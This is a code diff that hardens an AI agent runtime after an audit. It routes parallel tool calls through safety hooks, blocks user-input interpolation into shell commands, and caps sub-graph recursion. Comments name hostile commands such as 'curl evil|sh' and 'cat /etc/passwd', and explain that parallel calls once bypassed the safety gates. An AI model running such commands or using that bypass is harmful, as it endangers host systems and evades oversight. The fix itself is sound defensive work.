@@ -53,6 +53,16 @@ def _env_flag(name: str, default: bool = False) -> bool:
     return raw.strip().lower() in ("1", "true", "yes", "on")
 
 
+def _max_sub_graph_depth() -> int:
+    # 审计 E-16: 子图递归深度上限. 默认 8, FUSION_SUB_GRAPH_MAX_DEPTH 调.
+    raw = os.environ.get("FUSION_SUB_GRAPH_MAX_DEPTH", "").strip()
+    try:
+        val = int(raw) if raw else 8
+        return val if val > 0 else 8
+    except ValueError:
+        return 8
+
+
 class ConditionEngine:
     """Evaluates condition expressions against agent context.
 
@@ -288,6 +298,11 @@ class AgentRuntime:
         # nodes awaiting approval (mirrors _safety_futures pattern).
         self.plan_mode: bool = False
         self._plan_futures: dict[str, asyncio.Future[bool]] = {}
+        # 审计 E-16/P0-4: 子图递归深度计数器. 无上限 -> 含子图循环引用 (A 子图
+        # 指向 B, B 指向 A, 含无意构建) 触发无限递归 RecursionError 栈溢出崩溃
+        # 整个 runtime 进程. 顶层执行 depth=0, 每进一层子图 +1, 超 _MAX_SUB_GRAPH_DEPTH
+        # (默认 8, FUSION_SUB_GRAPH_MAX_DEPTH 调) 挡并报错.
+        self._sub_graph_depth: int = 0
         # Read-only tools allowed during plan_mode. Write tools are blocked.
         self._plan_readonly_tools: set[str] = {
             "file_read",
@@ -1815,7 +1830,45 @@ class AgentRuntime:
         self, node: NodeConfig, func_name: str, func_args: dict
     ) -> tuple[str, bool]:
         # C1 并行工具执行: 验参 + 配置默认 + execute, 返回 (result_str, is_error)。
-        # pre_tool_use hook 在并行路径不阻 (hook 需顺序副作用); 控制流工具已排除。
+        # 审计 E-3/P0-3: 旧并行路径跳过 PRE_TOOL_USE hook + SafetyGateway L3 内容
+        # 检查 — parallel_tool_calls=True 可绕过 shell/网络/写入门, RCE 向量.
+        # 现在此处与顺序路径 (llm_func_call 1434-1497) 对齐:
+        #   1. PRE_TOOL_USE hook — block 决策直接返回 blocked 结果
+        #   2. SafetyGateway evaluate_action(category=tool_call) — 内容匹配危险
+        #      模式 (rm -rf / / DROP TABLE) -> block; L2/L3 需审批 -> fail-closed
+        #      (并行无法 yield 审批流), 返回 error 促使 LLM 回退顺序审批路径.
+        pre = await self._fire_tool_hooks("PRE_TOOL_USE", func_name, func_args)
+        if pre is not None and pre.decision == "block":
+            blocked = f"Blocked by hook: {pre.reason or 'pre_tool_use'}"
+            logger.info(
+                "parallel tool blocked by hook tool=%s reason=%s",
+                func_name,
+                pre.reason,
+            )
+            return blocked, True
+        if self.safety_gateway:
+            safety_result = self.safety_gateway.evaluate_action(
+                category="tool_call",
+                content=f"{func_name}({func_args})",
+                context=f"tool={func_name} node={node.label} path=parallel",
+            )
+            if safety_result.action.value == "block":
+                # 内容匹配危险模式 (rm -rf / / DROP TABLE) 或无 policy
+                # fail-closed: 并行路径硬 block, 不可审批 (并行无审批流).
+                blocked = f"SafetyGateway blocked parallel tool: {safety_result.reason}"
+                logger.warning(
+                    "safety blocked parallel tool=%s node=%s reason=%s",
+                    func_name,
+                    node.label,
+                    safety_result.reason,
+                )
+                return blocked, True
+            if safety_result.requires_approval:
+                return (
+                    f"Error: tool '{func_name}' requires approval; "
+                    f"parallel path cannot pause for approval, retry sequentially",
+                    True,
+                )
         try:
             tool = self.tools.get(func_name)
             if tool is None:
@@ -2181,6 +2234,33 @@ class AgentRuntime:
             return
 
         params = {}
+        # 审计 E-4/P0-4: 插值 → 终端命令注入. `{{user_input}}` 直连 terminal
+        # `command` 时, 攻击者控制的图输入成 shell 命令 (curl evil|sh / cat
+        # /etc/passwd / scp 私钥), 绕灾难黑名单. 此处 fail-closed: terminal
+        # command 含变量插值一律挡, 需 FUSION_TERMINAL_ALLOW_INTERP=1 显式 opt-in
+        # (受控 CI). 转义 (shlex.quote) 仍漏多命令语义注入, 故硬挡更安全.
+        if node.tool_name == "terminal":
+            _allow_interp = os.environ.get(
+                "FUSION_TERMINAL_ALLOW_INTERP", ""
+            ).strip().lower() in ("1", "true", "yes")
+            _cmd_template = node.tool_params.get("command", "")
+            if isinstance(_cmd_template, str) and "{{" in _cmd_template and not _allow_interp:
+                ctx.error = (
+                    "Blocked: terminal 'command' contains variable interpolation "
+                    "({{...}}); passing user-controlled input to a shell is an RCE "
+                    "vector. Use a non-shell tool, or set FUSION_TERMINAL_ALLOW_INTERP=1 "
+                    "for controlled environments."
+                )
+                logger.warning(
+                    "E-4 blocked terminal command interpolation node=%s", node.label
+                )
+                yield AgentEvent(
+                    type=AgentEventType.ERROR,
+                    content=ctx.error,
+                    node_id=node.label,
+                    metadata={"e4_blocked": True},
+                )
+                return
         for k, v in node.tool_params.items():
             if isinstance(v, str):
                 params[k] = self.variables.interpolate(v)
@@ -2704,6 +2784,25 @@ class AgentRuntime:
         input_mapping = params.get("input_mapping", {})
         output_mapping = params.get("output_mapping", {})
 
+        # 审计 E-16/P0-4: 递归深度门. 超上限挡 (子图循环引用致栈溢出崩溃进程).
+        max_depth = _max_sub_graph_depth()
+        if self._sub_graph_depth >= max_depth:
+            logger.warning(
+                "E-16 sub-graph depth limit hit depth=%d max=%d node=%s",
+                self._sub_graph_depth, max_depth, parent_node.label,
+            )
+            yield AgentEvent(
+                type=AgentEventType.ERROR,
+                content=(
+                    f"Sub-graph recursion depth limit reached ({self._sub_graph_depth} >= "
+                    f"{max_depth}). Possible circular sub-graph reference. "
+                    f"Set FUSION_SUB_GRAPH_MAX_DEPTH higher if intentional."
+                ),
+                node_id=parent_node.label,
+                metadata={"e16_depth": self._sub_graph_depth, "e16_max": max_depth},
+            )
+            return
+
         if not graph_json:
             yield AgentEvent(type=AgentEventType.ERROR, content="Sub-graph: no graph_json provided")
             return
@@ -2740,6 +2839,8 @@ class AgentRuntime:
         # 内容检查 + 无只读探索门禁 + 无持久化/记忆), 父图授权的安全策略
         # 在子图里静默失效.
         sub_runtime.plan_mode = self.plan_mode
+        # 审计 E-16: 子 runtime 继承父深度 +1, 递归计数贯穿整条子图链.
+        sub_runtime._sub_graph_depth = self._sub_graph_depth + 1
 
         sub_ctx = AgentContext()
         # Issue #175: lifecycle hook — sub-agent start.
